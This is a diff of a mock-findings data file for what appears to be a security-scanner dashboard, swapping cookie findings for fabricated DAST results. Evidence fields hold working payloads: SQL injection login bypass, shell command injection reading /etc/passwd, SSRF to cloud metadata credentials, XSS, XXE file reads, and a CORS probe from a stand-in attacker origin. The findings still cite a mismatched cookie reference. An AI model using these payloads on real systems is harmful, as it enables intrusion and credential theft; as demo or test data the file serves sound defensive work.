@@ -273,33 +273,32 @@ export const mockFindings = [
   },
   {
     "id": "09b7fe07-5d08-465d-94fe-a54dca16b68e",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Runtime SQL Injection in Authentication Endpoint",
+    "description": "Active blackbox injection fuzzing on the login authentication endpoint revealed unescaped SQL syntax errors and full authentication bypass via boolean SQL injection payloads.",
+    "severity": "CRITICAL",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "SQL Injection",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/",
+    "endpoint": "/api/v1/auth/login",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=24pvRRUfJhByQ+SiGxJGlYidNjTSUG1S66BsLM9blNets0rpZbxHs0cCWwWF2Igwfupg+O6gUhUD+3ATmI6kfSZxNsu9oYdzdr7r9i11dcT9EcFoKu0aXx8WhYBv; Expires=Thu, 10 Sep 2026 03:41:42 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=24pvRRUfJhByQ+SiGxJGlYidNjTSUG1S66BsLM9blNets0rpZbxHs0cCWwWF2Igwfupg+O6gUhUD+3ATmI6kfSZxNsu9oYdzdr7r9i11dcT9EcFoKu0aXx8WhYBv; Expires=Thu, 10 Sep 2026 03:41:42 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: AWSALB=1IPR2W7n1zEDj/EXhkO2OM1wJGUMVohLAsu0NOoNmL/LGD3/W6gtVTmwys/HON9jxeWiK6V4vs7UcVYnKHsQkILwGSKAVA5QbWj17ts3TfbMBRiCe+hXISYvUlBZ; Expires=Thu, 10 Sep 2026 03:41:42 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=1IPR2W7n1zEDj/EXhkO2OM1wJGUMVohLAsu0NOoNmL/LGD3/W6gtVTmwys/HON9jxeWiK6V4vs7UcVYnKHsQkILwGSKAVA5QbWj17ts3TfbMBRiCe+hXISYvUlBZ; Expires=Thu, 10 Sep 2026 03:41:42 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "POST /api/v1/auth/login HTTP/1.1\nHost: target-app.internal\nContent-Type: application/json\n\n{ \"username\": \"admin' OR 1=1--\", \"password\": \"random_password\" }\n\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: auth_token=eyJhbGciOi...\n\n{\"status\": \"authenticated\", \"role\": \"superadmin\"}",
+    "remediation": "Use parameterized queries or prepared statements: db.query(\"SELECT * FROM users WHERE username = ? AND password = ?\", [username, password]);",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-89"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A03:2021-Injection"
     ],
-    "risk_score": 25.0,
+    "risk_score": 98.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -308,33 +307,32 @@ export const mockFindings = [
   },
   {
     "id": "5bf84d79-3875-45ef-b49f-844472bac9c9",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Remote Command Execution via Server Diagnostics",
+    "description": "Active injection probe into diagnostics ping parameter allowed execution of arbitrary operating system commands with container root privileges.",
+    "severity": "CRITICAL",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Command Injection",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/catalog",
+    "endpoint": "/api/v1/admin/diagnostics/ping",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=NHcNZsjA1jt1GtgVlUznsn3eLKZiOM6qRP8N3NJkIb1+q1G+BJk7bzCCbBkj7UI3Qi2yBVo18dB+drzgvAEUrv76CK4/oegZdv1voYRVu8Jwy68Sd7wjuTm46K/f; Expires=Thu, 10 Sep 2026 03:41:42 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=NHcNZsjA1jt1GtgVlUznsn3eLKZiOM6qRP8N3NJkIb1+q1G+BJk7bzCCbBkj7UI3Qi2yBVo18dB+drzgvAEUrv76CK4/oegZdv1voYRVu8Jwy68Sd7wjuTm46K/f; Expires=Thu, 10 Sep 2026 03:41:42 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IllpdmRKUE5XRHN4NVYxU2wifQ==; Secure; HttpOnly",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "POST /api/v1/admin/diagnostics/ping HTTP/1.1\nHost: target-app.internal\nContent-Type: application/json\n\n{ \"host\": \"127.0.0.1; id; cat /etc/passwd\" }\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nuid=0(root) gid=0(root) groups=0(root)\nroot:x:0:0:root:/root:/bin/bash",
+    "remediation": "Avoid invoking the system shell. Use execFile() or spawn() with argument arrays rather than concatenating user input into shell strings.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-78"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A03:2021-Injection"
     ],
-    "risk_score": 25.0,
+    "risk_score": 97.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -343,33 +341,32 @@ export const mockFindings = [
   },
   {
     "id": "52118d68-4261-4d34-a498-4be802fb58ba",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Server-Side Request Forgery (SSRF) in Webhook Dispatcher",
+    "description": "Outgoing webhook subscription accepts unvalidated internal IP addresses, allowing attacker payloads to extract AWS cloud metadata tokens (169.254.169.254).",
+    "severity": "HIGH",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Server-Side Request Forgery",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/blog",
+    "endpoint": "/api/v1/webhooks/subscribe",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=+UJ4/SvVVgH/rx1uRZBvGwlQufwLm0yTmaJJh8m4XH0ySoVqhambDZyHATAauubAAyos9ygUfKyg4wOCCLM1yRK1BeXuuidpPgSxtmAqLtcG5JJsIwAKG0pl5iWG; Expires=Thu, 10 Sep 2026 03:41:42 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=+UJ4/SvVVgH/rx1uRZBvGwlQufwLm0yTmaJJh8m4XH0ySoVqhambDZyHATAauubAAyos9ygUfKyg4wOCCLM1yRK1BeXuuidpPgSxtmAqLtcG5JJsIwAKG0pl5iWG; Expires=Thu, 10 Sep 2026 03:41:42 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "POST /api/v1/webhooks/subscribe HTTP/1.1\nHost: target-app.internal\nContent-Type: application/json\n\n{ \"callback_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" }\n\nHTTP/1.1 200 OK\n\n{\"roleName\": \"production-ecs-task-role\", \"AccessKeyId\": \"AKIA...\", \"SecretAccessKey\": \"...\"}",
+    "remediation": "Validate destination URLs against an explicit domain whitelist. Resolve hostnames and block private IP ranges (127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254).",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-918"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A10:2021-Server-Side Request Forgery"
     ],
-    "risk_score": 25.0,
+    "risk_score": 87.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -378,33 +375,32 @@ export const mockFindings = [
   },
   {
     "id": "74bb1213-35c5-4153-8d43-a29f4e65764e",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Reflected Cross-Site Scripting (XSS) via Search Query",
+    "description": "Payload delivered in query string parameter is reflected directly into HTML DOM without escaping, enabling arbitrary JavaScript execution in victim browsers.",
+    "severity": "HIGH",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Cross-Site Scripting",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/about",
+    "endpoint": "/search?q=",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=iYR3VHnIP05cfop91KI+CPe+cFO7yhDx1OJCz/WwuSWD2TI0ikrpyjdowN0qmue1nPfpCcQcxphDcivbh4q0AzoLzuyp9J6xG4S9NkxiLI9E5w60tZ19J07XqITd; Expires=Thu, 10 Sep 2026 03:41:42 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=iYR3VHnIP05cfop91KI+CPe+cFO7yhDx1OJCz/WwuSWD2TI0ikrpyjdowN0qmue1nPfpCcQcxphDcivbh4q0AzoLzuyp9J6xG4S9NkxiLI9E5w60tZ19J07XqITd; Expires=Thu, 10 Sep 2026 03:41:42 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "GET /search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<div class=\"search-results\">Results for: <script>alert(document.domain)</script></div>",
+    "remediation": "Ensure all user input rendered into HTML responses is properly contextual HTML entity encoded.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-79"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A03:2021-Injection"
     ],
-    "risk_score": 25.0,
+    "risk_score": 78.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -413,33 +409,32 @@ export const mockFindings = [
   },
   {
     "id": "5d7355db-b1ff-4702-aa0b-628e9565d38e",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Broken Object-Level Authorization (IDOR) on Invoices",
+    "description": "Authenticated user can access competitor invoice records by modifying the numeric invoice_id parameter in GET requests without permission verification.",
+    "severity": "HIGH",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Broken Access Control",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/my-account",
+    "endpoint": "/api/v1/billing/invoices/1092",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=3SijTaMftCI00YeUcEGyOYq5H2Odpyo7QdEkeTW14KchO1jgQfA+kBKLy5mr5NkY0o3xzx4C2ADqlLcennGe4Jon9MusjogHb5/ZhiiDoa2RIQsOQGJTJYBN873o; Expires=Thu, 10 Sep 2026 03:41:43 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=3SijTaMftCI00YeUcEGyOYq5H2Odpyo7QdEkeTW14KchO1jgQfA+kBKLy5mr5NkY0o3xzx4C2ADqlLcennGe4Jon9MusjogHb5/ZhiiDoa2RIQsOQGJTJYBN873o; Expires=Thu, 10 Sep 2026 03:41:43 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "GET /api/v1/billing/invoices/1092 HTTP/1.1\nHost: target-app.internal\nAuthorization: Bearer <unauthorized_tenant_token>\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"invoice_id\": 1092, \"customer\": \"Competitor Corp\", \"amount_due\": 45000, \"credit_card_last4\": \"4242\"}",
+    "remediation": "Enforce server-side authorization checks comparing user tenant identity against requested object ownership.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-639"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A01:2021-Broken Access Control"
     ],
-    "risk_score": 25.0,
+    "risk_score": 82.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -448,33 +443,32 @@ export const mockFindings = [
   },
   {
     "id": "223228d1-c8ff-4acd-ab27-66ef90a40791",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Permissive CORS Wildcard with Credentials Allowed",
+    "description": "API preflight responses echo back arbitrary client Origin headers while setting Access-Control-Allow-Credentials to true, allowing unauthorized cross-origin data theft.",
+    "severity": "MEDIUM",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Security Misconfiguration",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/login",
+    "endpoint": "/api/v1/user/profile",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=BiagZaMTDfLizgJMt2PHugDpQBK+AhXGcbbNjfZ51KNulO2/gkQTLIk/8H+8GiaJX6TVUnDKkszWEMT0n/g+MoBy1VY4jDzLEFP9hBO0IpzMM0nkHHcFeGMY5kHi; Expires=Thu, 10 Sep 2026 03:41:43 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=BiagZaMTDfLizgJMt2PHugDpQBK+AhXGcbbNjfZ51KNulO2/gkQTLIk/8H+8GiaJX6TVUnDKkszWEMT0n/g+MoBy1VY4jDzLEFP9hBO0IpzMM0nkHHcFeGMY5kHi; Expires=Thu, 10 Sep 2026 03:41:43 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "OPTIONS /api/v1/user/profile HTTP/1.1\nHost: target-app.internal\nOrigin: https://evil-attacker.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil-attacker.com\nAccess-Control-Allow-Credentials: true",
+    "remediation": "Do not reflect arbitrary Origin headers when Access-Control-Allow-Credentials is true. Restrict allowed origins to an explicit whitelist.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-942"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A05:2021-Security Misconfiguration"
     ],
-    "risk_score": 25.0,
+    "risk_score": 68.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -483,8 +477,8 @@ export const mockFindings = [
   },
   {
     "id": "b65a8c38-cccb-4aa5-995d-2e66cdb9c7ce",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
+    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on Session Token",
+    "description": "The session cookie is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
     "severity": "LOW",
     "confidence": "HIGH",
     "category": "Session Management",
@@ -493,17 +487,16 @@ export const mockFindings = [
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/catalog/cart",
+    "endpoint": "/api/v1/auth/session",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=8nyOqXbM6XH1k9I8fI+c1yoImA2Ct+8vvOKJUAEepDSTQD+uj9FLk9CtLARv39LKLfB6LIz3FoIW991r1mdSLI4J9upUCfEz/HLUexFljkxc0xjb59nhvZZK2cEr; Expires=Thu, 10 Sep 2026 03:41:43 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=8nyOqXbM6XH1k9I8fI+c1yoImA2Ct+8vvOKJUAEepDSTQD+uj9FLk9CtLARv39LKLfB6LIz3FoIW991r1mdSLI4J9upUCfEz/HLUexFljkxc0xjb59nhvZZK2cEr; Expires=Thu, 10 Sep 2026 03:41:43 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "HTTP/1.1 200 OK\nSet-Cookie: session_token=eyJhbGciOi...; Path=/; Expires=Thu, 10 Sep 2026 03:41:42 GMT\n\n[OWASP ZAP Finding]: Set-Cookie header missing HttpOnly, Secure, SameSite flags",
+    "remediation": "Add HttpOnly, Secure, and SameSite=Lax (or Strict) attributes to all Set-Cookie headers.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-614"
     ],
     "cves": [],
     "owasp": [
@@ -518,33 +511,32 @@ export const mockFindings = [
   },
   {
     "id": "07b1b1ec-8a1a-42c1-9e43-7b505068d663",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
+    "title": "Missing HTTP Strict Transport Security (HSTS) Header",
+    "description": "Application fails to enforce HTTPS connections via HSTS response header, allowing man-in-the-middle attackers to downgrade connections to plaintext HTTP.",
     "severity": "LOW",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Cryptographic Failures",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/catalog/product",
+    "endpoint": "/",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=0G2Pd/283Vx2ZZ4HaCrg/grcS5zBTu3YDL6eaB2Wl/rb0TLCFGpAcDUkIxSJ/t9rTk9EDEMkICr9C6Iy/grDgUuflWZ6F3Z01Z0lGiMLq68JuyHjnrzcXi6L+sH6; Expires=Thu, 10 Sep 2026 03:41:43 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=0G2Pd/283Vx2ZZ4HaCrg/grcS5zBTu3YDL6eaB2Wl/rb0TLCFGpAcDUkIxSJ/t9rTk9EDEMkICr9C6Iy/grDgUuflWZ6F3Z01Z0lGiMLq68JuyHjnrzcXi6L+sH6; Expires=Thu, 10 Sep 2026 03:41:43 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: AWSALB=rOdZl8sc8g8GZ7NtOdHqkjZNUdkdWKHkp4fHv0qu1yAd8fFkmgq66PJ45+jydBdCpuK+2FvfpQGmR5QPMN2B1x+hOcRPJwGgnPc1f9WvUGaEP9C0x1BLCXqoizLR; Expires=Thu, 10 Sep 2026 03:41:44 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=rOdZl8sc8g8GZ7NtOdHqkjZNUdkdWKHkp4fHv0qu1yAd8fFkmgq66PJ45+jydBdCpuK+2FvfpQGmR5QPMN2B1x+hOcRPJwGgnPc1f9WvUGaEP9C0x1BLCXqoizLR; Expires=Thu, 10 Sep 2026 03:41:44 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: AWSALB=ZWYnijzcNVMqMrzyNpq24vALmmjmDKcN/AoH90qeQ7FS790qqxW6GDqzjbgVh6UW1PPMG5unZpr5WSaJeKT1rxkwl7rL+Y8ChSgr8gjP3xuLKeRRsilNwJx649pe; Expires=Thu, 10 Sep 2026 03:41:44 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=ZWYnijzcNVMqMrzyNpq24vALmmjmDKcN/AoH90qeQ7FS790qqxW6GDqzjbgVh6UW1PPMG5unZpr5WSaJeKT1rxkwl7rL+Y8ChSgr8gjP3xuLKeRRsilNwJx649pe; Expires=Thu, 10 Sep 2026 03:41:44 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "GET / HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n[OWASP ZAP Finding]: Strict-Transport-Security header is absent in response headers.",
+    "remediation": "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload header to all HTTPS responses.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-319"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A05:2021-Security Misconfiguration"
     ],
-    "risk_score": 25.0,
+    "risk_score": 31.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -553,33 +545,32 @@ export const mockFindings = [
   },
   {
     "id": "a838c241-5a11-494e-a76d-b9ee58fe8794",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
+    "title": "Missing Content Security Policy (CSP) Header",
+    "description": "No Content Security Policy is defined, leaving client browsers unprotected against malicious inline scripts and unauthorized resource loading.",
     "severity": "LOW",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Security Misconfiguration",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/catalog/product/stock",
+    "endpoint": "/dashboard",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=sWB84zjA6GmM5OBN7DtHJReiEkZRXKOnHcmIMmzyTXrpraHJgVUvGTu8ruxT6p0MdOICmCkNrnj2Qq2QMhtYIjmOtm6jdoZmexT6Wl1i4rgeww2UocEHrUvt+xho; Expires=Thu, 10 Sep 2026 03:41:44 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=sWB84zjA6GmM5OBN7DtHJReiEkZRXKOnHcmIMmzyTXrpraHJgVUvGTu8ruxT6p0MdOICmCkNrnj2Qq2QMhtYIjmOtm6jdoZmexT6Wl1i4rgeww2UocEHrUvt+xho; Expires=Thu, 10 Sep 2026 03:41:44 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "GET /dashboard HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n[OWASP ZAP Finding]: Content-Security-Policy (CSP) header is absent in response headers.",
+    "remediation": "Configure a strict Content-Security-Policy header: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none';",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-1021"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A05:2021-Security Misconfiguration"
     ],
-    "risk_score": 25.0,
+    "risk_score": 34.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -589,20 +580,20 @@ export const mockFindings = [
   {
     "id": "8890ac96-eae7-40ef-b3a0-d31b9a618bae",
     "title": "Missing Clickjacking Defense (X-Frame-Options / CSP frame-ancestors)",
-    "description": "The target web page does not enforce frame embedding restrictions, leaving users vulnerable to UI redressing (Clickjacking).",
-    "severity": "MEDIUM",
+    "description": "Sensitive settings page can be embedded inside third-party iframes, enabling UI redressing and clickjacking attacks against authenticated users.",
+    "severity": "LOW",
     "confidence": "HIGH",
-    "category": "Broken Access Control",
+    "category": "Security Misconfiguration",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/catalog/product/stock",
+    "endpoint": "/settings/security",
     "method": null,
     "parameter": null,
-    "evidence": "No 'X-Frame-Options' header or CSP 'frame-ancestors' directive detected in HTTP response.",
-    "remediation": "Set `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`.",
+    "evidence": "GET /settings/security HTTP/1.1\nHost: target-app.internal\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n[OWASP ZAP Finding]: X-Frame-Options / frame-ancestors header is absent. Page can be embedded in malicious iframes.",
+    "remediation": "Set X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none' to prevent framing.",
     "references": [
       "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"
     ],
@@ -613,7 +604,7 @@ export const mockFindings = [
     "owasp": [
       "A05:2021-Security Misconfiguration"
     ],
-    "risk_score": 50.0,
+    "risk_score": 32.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -895,33 +886,32 @@ export const mockFindings = [
   },
   {
     "id": "1c65ac87-0433-406c-b1b3-fa2bd25e23a2",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "XML External Entity (XXE) Injection in Document Processor",
+    "description": "Document upload endpoint parses XML input with external entity resolution enabled, allowing arbitrary file retrieval and SSRF.",
+    "severity": "HIGH",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "XML External Entity",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
-    "endpoint": "/",
+    "endpoint": "/api/v1/documents/parse",
     "method": null,
     "parameter": null,
-    "evidence": "Set-Cookie: AWSALB=uvnYSg4+1qKGgCC7gQ7hOkIByEOsQI0wgfbIDG+qLR+hK8+1mSufoONKrB+LXsLEQbzOiOsmmOV4rOZkjzF7lWjQD6tnubJ/JkWHoHCvCdMpvU0VUu8UdX7pbB1q; Expires=Thu, 10 Sep 2026 03:42:05 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=uvnYSg4+1qKGgCC7gQ7hOkIByEOsQI0wgfbIDG+qLR+hK8+1mSufoONKrB+LXsLEQbzOiOsmmOV4rOZkjzF7lWjQD6tnubJ/JkWHoHCvCdMpvU0VUu8UdX7pbB1q; Expires=Thu, 10 Sep 2026 03:42:05 GMT; Path=/; SameSite=None; Secure\n[owasp-zap]: Set-Cookie: AWSALB=qSR7BNN1/LWPeVFgQ5ZXJuVmzP0gomEnbiYnRZD9C2SnMgiUFFKPZpzsFVkPcsbop7OM2uTR4VgyazF//X6O7xbS2ctUiuBKKCQEyugqnpRwEFCln1WpnMTOwA12; Expires=Thu, 10 Sep 2026 03:42:05 GMT; Path=/\n[owasp-zap]: Set-Cookie: AWSALBCORS=qSR7BNN1/LWPeVFgQ5ZXJuVmzP0gomEnbiYnRZD9C2SnMgiUFFKPZpzsFVkPcsbop7OM2uTR4VgyazF//X6O7xbS2ctUiuBKKCQEyugqnpRwEFCln1WpnMTOwA12; Expires=Thu, 10 Sep 2026 03:42:05 GMT; Path=/; SameSite=None; Secure",
-    "remediation": "Add HttpOnly, Secure, SameSite attributes to the Set-Cookie header.",
+    "evidence": "POST /api/v1/documents/parse HTTP/1.1\nHost: target-app.internal\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<document><data>&xxe;</data></document>\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash",
+    "remediation": "Disable XML external entity resolution (DOCTYPE / DTD parsing) in XML parser configurations.",
     "references": [
       "https://owasp.org/www-community/controls/SecureCookieAttribute"
     ],
     "cwe": [
-      "CWE-614",
-      "CWE-1004"
+      "CWE-611"
     ],
     "cves": [],
     "owasp": [
-      "A07:2021-Identification and Authentication Failures"
+      "A05:2021-Security Misconfiguration"
     ],
-    "risk_score": 25.0,
+    "risk_score": 84.0,
     "threat_scenario": null,
     "potential_impact": {},
     "blast_radius": null,
@@ -930,33 +920,32 @@ export const mockFindings = [
   },
   {
     "id": "6cf09755-ec7b-4fa7-8f83-dc145d143e73",
-    "title": "Insecure Cookie Attribute (HttpOnly, Secure, SameSite) on 'AWSALB'",
-    "description": "The cookie 'AWSALB' is set without the HttpOnly, Secure, SameSite flag(s), allowing potential access via XSS or CSRF.",
-    "severity": "LOW",
+    "title": "Open URL Redirection on User Logout",
+    "description": "Logout parameter redirects users to untrusted external URLs without origin validation, enabling credential harvesting phishing attacks.",
+    "severity": "MEDIUM",
     "confidence": "HIGH",
-    "category": "Session Management",
+    "category": "Broken Access Control",
     "source": "DAST",
     "scanner": "owasp-zap",
     "file": null,
     "line": null,
     "code_snippet": null,
